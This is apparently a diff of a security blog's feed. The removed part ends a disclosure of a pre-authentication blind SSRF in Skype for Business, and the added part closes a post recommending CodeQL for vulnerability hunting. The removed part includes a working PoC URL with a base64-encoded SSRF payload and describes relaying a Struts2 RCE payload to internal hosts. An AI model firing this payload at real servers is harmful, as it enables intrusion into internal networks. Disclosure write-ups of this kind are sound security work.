-common hostname prefixes like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jira.contoso.com&lt;/code&gt; are also possible. If you need some inspiration for &lt;em&gt;Exploiting Blind SSRF&lt;/em&gt;, I highly recommend &lt;a href=&quot;https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/&quot;&gt;some&lt;/a&gt; &lt;a href=&quot;https://github.com/assetnote/blind-ssrf-chains&quot;&gt;resources&lt;/a&gt; by Assetnote.&lt;/p&gt;
-
-&lt;p&gt;After I showed this vulnerability to my teammates &lt;a href=&quot;https://twitter.com/codewhitesec&quot;&gt;@codewhitesec&lt;/a&gt;, a result in discussion with &lt;a href=&quot;https://twitter.com/mwulftange&quot;&gt;Markus&lt;/a&gt; ended in an even more beautiful regex breaker (of course the previous examples might work for most cases of exploitation cases as well).&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/skypethings/skype_regex4.png&quot; alt=&quot;Regex4&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;With this, we could basically control everything as needed. And since there are tons of vulnerable systems
-(especially in intranet corporate networks), such as routers, Jenkins, or lately VMware Workspace ONE Access (exploitable with a single GET request), this &lt;em&gt;Pre-Auth Blind SSRF&lt;/em&gt; should indeed be seen as an &lt;em&gt;internet perimeter leak&lt;/em&gt; threat.&lt;/p&gt;
-
-&lt;p&gt;Finally, what’s missing? Right, &lt;strong&gt;PoC||GTFO&lt;/strong&gt;.
-Our Skype server &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SKYPE01&lt;/code&gt; has the IP address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.137.0.27&lt;/code&gt; (right). A second machine at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.137.0.26&lt;/code&gt; (left) sends the SSRF payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://skype01.contoso.com/lwa/Webpages/LwaClient.aspx?meeturl=aHR0cDovLzEwLjEzNy4wLjI2Lz9pZD1QT0MlMjV7MTMzNyoxMzM3fSMueHgvLw==&lt;/code&gt; and also provides an HTTP service so we’re able to receive HTTP requests and investigate the related log files.&lt;/p&gt;
-
-&lt;p&gt;For me it seemed easier to provide a nice screenshot with only two machines such that the attacker and victim machine
-happens to be the same at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.137.0.26&lt;/code&gt; but it doesn’t really matter. A well-known Struts2 RCE payload (CVE-2019-0230) was sent
-but any payload deliverable with a GET request is exploitable.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/skypethings/skype_poc.png&quot; alt=&quot;PoC&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="vulns4free" /><summary type="html">Update 2023-10-10: After a year, Microsoft decided to provide a patch for this - CVE-2023-41763</summary></entry></feed>
+&lt;p&gt;You might think: well, this was easy. Yeeesss, it was and everbody could have done it for sure. Use the tools and knowledge of all the bright people in infosec to help you through your journey of finding critical vulnerabilities. But please also have a deeper look into CodeQL first. From my experience, this was a total showcase, i.e. you might write your own queries and understand possible source APIs of your target application first before achieving any meaningful results. There exist some awesome workshops even with &lt;a href=&quot;https://youtu.be/-bJ2Ioi7Icg&quot;&gt;videos&lt;/a&gt; by the talented Alvaro Muñoz aka pwntester. I can also highly recommend the &lt;a href=&quot;https://youtu.be/nvCd0Ee4FgE&quot;&gt;workshop videos&lt;/a&gt; “Finding security vulnerabilities in Java with CodeQL”. There is so much more: search and profit!&lt;/p&gt;</content><author><name></name></author><category term="vulns4free" /><summary type="html">This write-up won’t be an intense discussion on security code review techniques this time. We’ll simply let do all the hard work by a third party: CodeQL.</summary></entry></feed>
